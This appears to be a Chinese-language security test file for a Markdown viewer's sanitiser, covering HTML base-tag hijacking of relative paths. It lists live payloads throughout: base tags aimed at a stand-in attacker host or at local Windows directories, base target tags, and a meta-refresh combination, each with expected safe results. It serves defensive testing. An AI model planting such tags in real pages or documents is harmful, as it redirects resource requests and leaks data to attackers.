# XSS 样本 11：base 标签劫持相对路径

**攻击手法**：`<base href="...">` 会重写**整个文档中所有相对地址**的解析基准。这对本应用是定向打击——查看态的本地图片、相对 `.md` 链接、导出时的路径重写，全都依赖"以 .md 所在目录为基准"这条规则。一旦 `<base>` 生效：

1. 文档里所有相对图片会转而向攻击者服务器发请求（附带文件名等信息）；
2. 相对 `.md` 链接点击后会指向外部地址；
3. 导出 HTML 时，路径重写解析器可能把外部地址当作"本地资源"处理，把攻击面带进产物。

`<base target="_blank">` 还能改变所有链接的打开方式。

**预期：脚本不执行、无外网请求。**（额外：下方相对路径资源的请求目标仍为本地，不得指向 `xss-beacon.example.invalid`）

**验证方法**：打开本文件 → Network 面板逐条检查图片请求的**实际 URL**，必须全部是本地 asset 协议地址 → 点击相对链接应在应用内打开本地文件 → Elements 面板中 `<base>` 已被剥离。

---

## payload 1：base href 指向攻击者服务器

<base href="https://xss-beacon.example.invalid/hijacked/">

## payload 2：紧随其后的相对资源（劫持是否生效的探针）

相对图片（应加载本地文件，而不是 `https://xss-beacon.example.invalid/hijacked/...`）：

![相对路径图片探针](../assets/architecture.png)

<img src="../assets-cn%20path/%E7%A4%BA%20%E4%BE%8B%E5%9B%BE.png" alt="中文空格路径探针">

相对链接（点击后应在应用内打开本地 .md）：

- [相对链接探针：核心基准文档](../full-gfm.md)
- [相对链接探针：压测语料](../longlines.md)

相对锚点（应仍在本文档内跳转）：

- [锚点探针](#payload-1base-href-指向攻击者服务器)

## payload 3：base 指向 file:// 与本地敏感目录

<base href="file:///C:/Windows/">

<base href="file:///C:/Users/">

## payload 4：base target 改变链接打开方式

<base target="_blank">

<base target="_top">

预期：外链的打开行为仍由应用的链接矩阵决定（外链交给系统默认浏览器），不受 `<base target>` 影响。

## payload 5：多个 base（只有第一个生效，但都必须被剥离）

<base href="https://xss-beacon.example.invalid/first/">
<base href="https://xss-beacon.example.invalid/second/">

## payload 6：base 出现在文档尾部（部分解析器只查文档头）

正文中间的普通段落，用于把下一个 `<base>` 推到文档后半部分。

<base href="https://xss-beacon.example.invalid/late/">

![尾部 base 之后的图片探针](../assets/architecture.png)

## payload 7：base 与 meta refresh 组合

<base href="https://xss-beacon.example.invalid/combo/">
<meta http-equiv="refresh" content="3;url=next.html">

预期：既不发生跳转，也不产生对 `xss-beacon.example.invalid/combo/next.html` 的请求。

---

> **判定口径**：文档中所有相对资源的实际请求 URL 仍以本文件所在目录（`test-corpus/xss-suite/`）为基准；Network 中 `xss-beacon.example.invalid` 零请求。
> **导出侧回归**：本文件还必须走一遍"导出单文件 HTML"与"导出 HTML+资源目录"——检查产物里不含 `<base>`，且资源路径重写结果仍指向本地文件。这是路径重写解析器最容易被绕过的一处。
